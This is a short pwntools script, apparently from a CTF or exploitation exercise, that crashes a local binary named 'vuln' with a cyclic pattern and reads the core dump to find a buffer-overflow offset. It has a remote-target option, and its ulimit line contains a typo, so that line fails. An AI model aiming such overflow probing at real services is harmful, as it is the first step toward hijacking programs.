import pwn
import os

os.system("ulimit -c umlimited")

LOCAL = 1
HOST = ""
PORT = 0

elf = pwn.ELF("./vuln")

if LOCAL:
    p = elf.process()
else:
    p = pwn.remote(HOST, PORT)

payload = pwn.cyclic(1000)
p.sendline(b"84")
p.sendlineafter(b"Name? ", payload)
p.wait()
core = p.corefile.fault_addr
offset = pwn.cyclic_find(core & 0xFFFFFFFF)
print(offset)
